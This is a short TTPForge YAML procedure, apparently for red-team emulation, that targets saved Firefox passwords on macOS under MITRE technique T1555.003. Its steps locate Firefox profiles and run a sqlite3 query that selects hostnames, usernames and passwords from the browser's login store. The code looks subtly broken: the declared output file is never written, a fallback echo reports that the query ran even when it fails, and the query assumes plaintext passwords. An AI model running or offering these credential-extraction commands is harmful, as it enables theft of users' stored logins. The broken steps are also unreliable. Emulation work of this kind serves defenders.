---
api_version: 2.0
uuid: 76440750-dadb-4d76-9ef1-60c45fea8a87
name: Firefox Password Extraction
authors:
- TTPForge
description: |
  Extract stored passwords from Firefox browser
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1555 Credentials from Password Stores
  subtechniques:
  - 'T1555.003 Credentials from Password Stores: Credentials from Web Browsers'
requirements:
  platforms:
  - os: darwin
args:
- name: output_file
  description: File to store extracted passwords
  type: string
  default: /tmp/firefox_passwords.txt
- name: firefox_profile
  description: Firefox profile to target
  type: string
  default: default-release
steps:
- name: Check Firefox Profile
  inline: test -d ~/Library/Application\ Support/Firefox/Profiles && echo 'Firefox found'
- name: List Firefox Profiles
  inline: ls -la ~/Library/Application\ Support/Firefox/Profiles/ 2>/dev/null | grep -E '^d' | awk '{print $NF}'
- name: Query Firefox Logins
  inline: sqlite3 ~/Library/Application\ Support/Firefox/Profiles/*/logins.sqlite 'SELECT hostname, username, password FROM
    moz_logins;' 2>/dev/null || echo 'Firefox logins database queried'
  cleanup:
    inline: rm -f {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
